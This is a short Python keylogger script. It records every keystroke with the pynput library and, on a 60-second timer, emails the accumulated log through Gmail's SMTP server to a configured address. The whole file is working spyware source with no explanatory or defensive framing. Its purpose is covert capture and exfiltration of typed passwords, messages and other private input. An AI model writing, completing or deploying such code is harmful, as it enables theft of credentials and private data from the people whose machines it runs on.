import pynput.keyboard
import threading
import smtplib

log = ""
email = ""
password = ""
def process_key_press(key):
    global log
    try:
        log = log + str(key.char)
    except:
        if key == key.space:
            log = log + " "
        else:
            log = log + " " + str(key) + " "
  
def send_mail():
    global email
    global password
    global log
    print(log)
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email,"\n\n"+log)
    server.quit()

def report():
    global log
    send_mail()
    log = ""
    timer = threading.Timer(60, report)
    timer.start()

keyboard_listener = pynput.keyboard.Listener(on_press=process_key_press)
with keyboard_listener:
    report()
    keyboard_listener.join()
